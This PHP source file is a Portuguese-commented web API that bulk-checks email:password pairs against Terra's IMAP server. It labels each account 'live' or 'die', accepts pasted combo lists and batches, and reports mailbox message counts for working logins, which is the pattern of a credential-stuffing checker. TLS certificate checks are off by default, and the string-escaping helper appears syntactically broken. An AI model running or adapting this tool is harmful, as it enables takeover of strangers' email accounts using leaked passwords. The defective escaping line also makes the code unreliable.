<?php
/**
 * api.php
 * Validador IMAP Terra via Socket SSL/TLS direto
 * Sem dependência de extensão imap — só precisa de openssl
 * Compatível com Render, Heroku, e qualquer hosting com PHP 8+
 */
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');

class TerraValidator {
    private array $config;
    private array $diag = [];

    public function __construct() {
        $this->config = [
            'imap_server'   => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'     => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'       => (int)(getenv('IMAP_TIMEOUT') ?: 25),
            'max_retries'   => (int)(getenv('MAX_RETRIES') ?: 2),
            'validate_cert' => filter_var(getenv('IMAP_VALIDATE_CERT') ?: 'false', FILTER_VALIDATE_BOOL),
        ];
    }

    // ════════════════════════════════════════════════════════
    //  API PÚBLICA
    // ════════════════════════════════════════════════════════

    public function validate(string $email, string $password): array {
        $attempt  = 0;
        $last_err = '';
        $start    = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            $this->diag = [];

            try {
                $result = $this->attemptLogin($email, $password);

                if ($result['status'] === 'live') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                $last_err = $result['message'] ?? 'Erro desconhecido';

                // Credenciais inválidas → retorna imediato
                if (($result['reason'] ?? '') === 'invalid_credentials') {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }

                // Erro não-recuperável → retorna imediato
                if (!($result['retryable'] ?? false)) {
                    $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                    $result['attempts']   = $attempt;
                    return $result;
                }
            } catch (\Throwable $e) {
                $last_err = $e->getMessage();
                $this->diag[] = 'Throwable: ' . $last_err;
            }

            // Backoff exponencial
            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt - 1) * 1000000));
            }
        }

        return [
            'status'      => 'die',
            'email'       => $email,
            'attempts'    => $attempt,
            'last_error'  => $last_err,
            'reason'      => 'max_retries_exceeded',
            'elapsed_ms'  => round((microtime(true) - $start) * 1000, 2),
            'diagnostics' => $this->diag,
            'timestamp'   => date('Y-m-d H:i:s'),
        ];
    }

    public function validateBatch(array $credentials): array {
        $results = [];

        foreach ($credentials as $cred) {
            $email    = $cred['email']    ?? '';
            $password = $cred['password'] ?? '';

            if ($email === '' || $password === '') {
                $results[] = [
                    'email'   => $email,
                    'status'  => 'error',
                    'message' => 'Email ou senha ausentes',
                ];
                continue;
            }

            $results[] = $this->validate($email, $password);
        }

        return [
            'total'     => count($results),
            'live'      => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
            'die'       => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
            'results'   => $results,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    /**
     * Diagnóstico de conectividade — testa DNS, TCP, TLS e greeting IMAP
     */
    public function diagnostic(): array {
        $result = [
            'server'   => $this->config['imap_server'],
            'port'     => $this->config['imap_port'],
            'timeout'  => $this->config['timeout'],
            'php_ver'  => PHP_VERSION,
            'ssl_ext'  => extension_loaded('openssl') ? 'yes' : 'NO',
            'tests'    => [],
        ];

        // ── Teste 1: DNS ──
        $dns_start = microtime(true);
        $ips = @gethostbynamel($this->config['imap_server']);
        $result['tests']['dns'] = [
            'ok'         => !empty($ips),
            'ips'        => $ips ?: [],
            'elapsed_ms' => round((microtime(true) - $dns_start) * 1000, 2),
        ];

        if (empty($ips)) {
            $result['tests']['dns']['error'] = 'Falha ao resolver DNS';
            return $result;
        }

        // ── Teste 2: TCP bruto ──
        $tcp_start = microtime(true);
        $tcp = @fsockopen($ips[0], $this->config['imap_port'], $errno, $errstr, $this->config['timeout']);
        $result['tests']['tcp'] = [
            'ok'         => $tcp !== false,
            'elapsed_ms' => round((microtime(true) - $tcp_start) * 1000, 2),
        ];

        if ($tcp === false) {
            $result['tests']['tcp']['error'] = "errno={$errno}; {$errstr}";
            $result['tests']['tcp']['note']  = 'Render pode bloquear porta 993. Verifique se outbound ports estão liberados.';
            return $result;
        }
        fclose($tcp);

        // ── Teste 3: SSL/TLS + Greeting IMAP ──
        $tls_start = microtime(true);
        $ctx = stream_context_create([
            'ssl' => [
                'verify_peer'       => false,
                'verify_peer_name'  => false,
                'allow_self_signed' => true,
            ],
        ]);

        $remote = sprintf('ssl://%s:%d', $this->config['imap_server'], $this->config['imap_port']);
        $socket = @stream_socket_client($remote, $errno2, $errstr2, $this->config['timeout'], STREAM_CLIENT_CONNECT, $ctx);

        $result['tests']['tls'] = [
            'ok'         => $socket !== false,
            'elapsed_ms' => round((microtime(true) - $tls_start) * 1000, 2),
        ];

        if ($socket === false) {
            $result['tests']['tls']['error'] = "errno={$errno2}; {$errstr2}";
            return $result;
        }

        stream_set_timeout($socket, $this->config['timeout']);
        $greeting = @fgets($socket, 8192);
        fclose($socket);

        $result['tests']['tls']['greeting'] = $greeting ?: '(vazio)';
        $result['tests']['tls']['imap_ok']  = ($greeting !== false && stripos($greeting, 'OK') !== false);

        return $result;
    }

    // ════════════════════════════════════════════════════════
    //  CONEXÃO E AUTENTICAÇÃO IMAP
    // ════════════════════════════════════════════════════════

    private function attemptLogin(string $email, string $password): array {
        // ── 1. Resolver DNS ──
        $ips = @gethostbynamel($this->config['imap_server']);
        if (empty($ips)) {
            $this->diag[] = "DNS falhou para {$this->config['imap_server']}";
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Falha de DNS',
                'reason'    => 'dns_error',
                'retryable' => true,
            ];
        }
        $this->diag[] = "DNS resolvido: {$ips[0]}";

        // ── 2. Conectar via SSL/TLS ──
        // ssl:// = TLS implícito (correto para porta 993/IMAPS)
        $remote  = sprintf('ssl://%s:%d', $this->config['imap_server'], $this->config['imap_port']);
        $errno   = 0;
        $errstr  = '';
        $context = stream_context_create([
            'ssl' => [
                'verify_peer'       => $this->config['validate_cert'],
                'verify_peer_name'  => $this->config['validate_cert'],
                'allow_self_signed' => !$this->config['validate_cert'],
            ],
        ]);

        $socket = @stream_socket_client(
            $remote,
            $errno,
            $errstr,
            $this->config['timeout'],
            STREAM_CLIENT_CONNECT,
            $context
        );

        if ($socket === false) {
            $this->diag[] = "Socket SSL falhou: errno={$errno} errstr={$errstr}";
            return [
                'status'       => 'die',
                'email'        => $email,
                'message'      => 'Falha de conexão SSL/TLS',
                'reason'       => 'connection_error',
                'retryable'    => true,
                'error_detail' => "errno={$errno}; {$errstr}",
            ];
        }

        stream_set_timeout($socket, $this->config['timeout']);
        $this->diag[] = 'Socket SSL conectado';

        // ── 3. Ler greeting IMAP ──
        $greeting = @fgets($socket, 8192);

        if ($greeting === false || $greeting === '') {
            fclose($socket);
            $this->diag[] = 'Greeting vazio ou nulo';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Sem resposta do servidor (greeting)',
                'reason'    => 'empty_greeting',
                'retryable' => true,
            ];
        }

        if (stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = "Greeting sem OK: " . trim($greeting);
            return [
                'status'       => 'die',
                'email'        => $email,
                'message'      => 'Servidor não é IMAP válido',
                'reason'       => 'bad_greeting',
                'retryable'    => false,
                'error_detail' => trim($greeting),
            ];
        }
        $this->diag[] = 'Greeting OK: ' . trim($greeting);

        // ── 4. Enviar comando LOGIN ──
        $tag  = 'A001';
        $cmd  = sprintf(
            "%s LOGIN %s %s\r\n",
            $tag,
            $this->escapeImapString($email),
            $this->escapeImapString($password)
        );

        $written = fwrite($socket, $cmd);
        if ($written === false) {
            fclose($socket);
            $this->diag[] = 'Falha ao escrever no socket';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Falha ao enviar comando LOGIN',
                'reason'    => 'write_error',
                'retryable' => true,
            ];
        }
        $this->diag[] = "LOGIN enviado ({$written} bytes)";

        // ── 5. Ler resposta até a linha tagged ──
        $response = $this->readUntilTag($socket, $tag);
        $meta     = stream_get_meta_data($socket);

        if ($response === null || $response === '') {
            fclose($socket);
            $this->diag[] = 'Resposta nula após LOGIN';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Sem resposta após LOGIN',
                'reason'    => 'empty_response',
                'retryable' => true,
            ];
        }

        if (!empty($meta['timed_out'])) {
            fclose($socket);
            $this->diag[] = 'Timeout aguardando resposta do LOGIN';
            return [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Timeout aguardando resposta',
                'reason'    => 'timeout',
                'retryable' => true,
            ];
        }

        $this->diag[] = 'Resposta bruta: ' . trim($response);

        // ── 6. Analisar resposta ──
        $quoted_tag = preg_quote($tag, '/');

        // A001 OK — sucesso
        if (preg_match('/' . $quoted_tag . '\s+OK/i', $response)) {
            $msgs = $this->tryMessageCount($socket);

            // Logout limpo
            fwrite($socket, "A002 LOGOUT\r\n");
            fclose($socket);

            $this->diag[] = 'Login OK — autenticado';
            return [
                'status'           => 'live',
                'email'            => $email,
                'message'          => 'Autenticação bem-sucedida',
                'mailbox_messages' => $msgs,
                'authenticated_at' => date('Y-m-d H:i:s'),
            ];
        }

        // A001 NO — credenciais inválidas
        if (preg_match('/' . $quoted_tag . '\s+NO/i', $response)) {
            fclose($socket);
            $this->diag[] = 'Login NO — credenciais inválidas';
            return [
                'status'       => 'die',
                'email'        => $email,
                'message'      => 'Invalid credentials',
                'reason'       => 'invalid_credentials',
                'retryable'    => false,
                'error_detail' => $this->cleanImapResponse($response, $tag),
            ];
        }

        // A001 BAD — comando rejeitado
        if (preg_match('/' . $quoted_tag . '\s+BAD/i', $response)) {
            fclose($socket);
            $this->diag[] = 'Login BAD — comando rejeitado: ' . trim($response);
            return [
                'status'       => 'die',
                'email'        => $email,
                'message'      => 'Comando rejeitado pelo servidor',
                'reason'       => 'bad_command',
                'retryable'    => false,
                'error_detail' => $this->cleanImapResponse($response, $tag),
            ];
        }

        // Resposta inesperada
        fclose($socket);
        $this->diag[] = 'Resposta inesperada: ' . trim($response);
        return [
            'status'       => 'die',
            'email'        => $email,
            'message'      => 'Resposta IMAP inesperada',
            'reason'       => 'unexpected',
            'retryable'    => true,
            'error_detail' => trim($response),
        ];
    }

    // ════════════════════════════════════════════════════════
    //  HELPERS DE LEITURA DO SOCKET
    // ════════════════════════════════════════════════════════

    /**
     * Lê todas as linhas até encontrar a tagged response.
     */
    private function readUntilTag($socket, string $tag): ?string {
        $buffer   = '';
        $deadline = microtime(true) + $this->config['timeout'];

        while (!feof($socket)) {
            $line = @fgets($socket, 8192);
            if ($line === false) {
                break;
            }
            $buffer .= $line;

            // Linha tagged encontrada (ex: "A001 OK LOGIN completed")
            if (strpos(trim($line), $tag . ' ') === 0) {
                return $buffer;
            }

            // Verifica timeout do stream
            $meta = stream_get_meta_data($socket);
            if (!empty($meta['timed_out'])) {
                break;
            }

            // Deadline manual
            if (microtime(true) > $deadline) {
                break;
            }
        }

        return $buffer !== '' ? $buffer : null;
    }

    // ════════════════════════════════════════════════════════
    //  HELPERS DE PROTOCOLO IMAP
    // ════════════════════════════════════════════════════════

    /**
     * Escapa string para IMAP quoted string (RFC 3501).
     * Escapa apenas \ e " — todos os outros caracteres são válidos entre aspas.
     */
    private function escapeImapString(string $str): string {
        $escaped = str_replace(['\', '"'], ['\\', '\"'], $str);
        return '"' . $escaped . '"';
    }

    /**
     * Limpa a resposta IMAP removendo a tag e o status (OK/NO/BAD).
     */
    private function cleanImapResponse(string $response, string $tag): string {
        $lines = explode("\r\n", $response);
        foreach (array_reverse($lines) as $line) {
            $line = trim($line);
            if ($line !== '' && strpos($line, $tag . ' ') === 0) {
                $cleaned = preg_replace(
                    '/^' . preg_quote($tag, '/') . '\s+(OK|NO|BAD)\s*/i',
                    '',
                    $line
                );
                return $cleaned;
            }
        }
        return trim($response);
    }

    /**
     * Tenta obter contagem de mensagens via STATUS INBOX (MESSAGES).
     */
    private function tryMessageCount($socket): int {
        $tag = 'S001';
        $cmd = "{$tag} STATUS INBOX (MESSAGES)\r\n";

        if (fwrite($socket, $cmd) === false) {
            return 0;
        }

        $resp = $this->readUntilTag($socket, $tag);

        if ($resp !== null && preg_match('/MESSAGES\s+(\d+)/i', $resp, $m)) {
            return (int)$m[1];
        }

        return 0;
    }
}

// ════════════════════════════════════════════════════════════════
//  ROTEAMENTO PRINCIPAL
// ════════════════════════════════════════════════════════════════

$action = $_GET['action'] ?? '';
$validator = new TerraValidator();

// ── Endpoint de diagnóstico ──
// GET /api.php?action=diagnostic
if ($action === 'diagnostic') {
    echo json_encode($validator->diagnostic(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ── Endpoint de checagem ──
// POST /api.php?action=check
if ($action === 'check' || $action === '') {

    // Aceita POST form-data OU JSON
    $input = $_POST;
    $ct = $_SERVER['CONTENT_TYPE'] ?? '';

    if (empty($input) && stripos($ct, 'application/json') !== false) {
        $raw = file_get_contents('php://input');
        if (!empty($raw)) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                $input = $decoded;
            }
        }
    }

    $email    = $input['email']    ?? '';
    $password = $input['password'] ?? '';
    $batch    = $input['batch']    ?? null;

    // Formato alternativo: email:password em campo único
    if ($email === '' && !empty($input['cred'])) {
        $parts = explode(':', $input['cred'], 2);
        if (count($parts) === 2) {
            $email    = trim($parts[0]);
            $password = trim($parts[1]);
        }
    }

    // Formato alternativo: lista de email:password em texto
    if ($email === '' && empty($batch) && !empty($input['list'])) {
        $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
        $batch = [];
        foreach ($lines as $line) {
            $parts = explode(':', $line, 2);
            if (count($parts) === 2) {
                $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
            }
        }
    }

    // Executa validação
    if ($batch && is_array($batch) && count($batch) > 0) {
        // Modo lote
        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

    } elseif ($email !== '' && $password !== '') {
        // Modo simples
        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

    } else {
        // Erro — sem credenciais
        http_response_code(400);
        echo json_encode([
            'error' => 'Credenciais ausentes',
            'usage' => [
                'json'  => 'POST {"email":"user@terra.com.br","password":"senha"}',
                'form'  => 'POST email=user@terra.com.br&password=senha',
                'cred'  => 'POST cred=user@terra.com.br:senha',
                'batch' => 'POST {"batch":[{"email":"...","password":"..."}]}',
                'list'  => 'POST list=user1@terra.com.br:pass1\\nuser2@terra.com.br:pass2',
            ],
            'diagnostic' => 'GET /api.php?action=diagnostic',
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
    exit;
}

// ── Action desconhecido ──
http_response_code(404);
echo json_encode(['error' => 'Action desconhecida: ' . $action], JSON_UNESCAPED_UNICODE);
